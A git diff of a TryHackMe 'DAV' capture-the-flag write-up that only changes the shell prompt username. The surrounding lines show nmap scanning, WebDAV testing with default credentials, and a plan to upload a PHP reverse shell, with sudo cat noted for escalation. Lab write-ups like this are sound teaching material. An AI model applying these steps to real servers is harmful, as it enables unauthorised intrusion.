@@ -26,7 +26,7 @@ We can upload and execute php shell. www-data can execute cat as sudo so we can 
 ### Enumeration
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
+┌─[root@parrot]─[~/Desktop/tryhackme/DAV]
 └──╼ $nmap -sC -sV 10.10.229.29
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-17 15:20 IST
 Nmap scan report for 10.10.229.29
@@ -59,7 +59,7 @@ So let's run davtest to see what we can upload
 ![creds](/assets/img/dav/defaultcreds.png)
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
+┌─[root@parrot]─[~/Desktop/tryhackme/DAV]
 └──╼ $davtest -url http://10.10.229.29/webdav/ -auth wampp:xampp
 ********************************************************
  Testing DAV connection
@@ -122,7 +122,7 @@ Php is uploadable and executable.
 so we are now going to upload a reverse shell.
 
 ```bash
-┌─[✗]─[argenestel@parrot]─[~/Desktop/tryhackme/DAV]
+┌─[✗]─[root@parrot]─[~/Desktop/tryhackme/DAV]
 └──╼ $cadaver http://10.10.229.29/webdav/
 Authentication required for webdav on server `10.10.229.29':
 Username: xampp
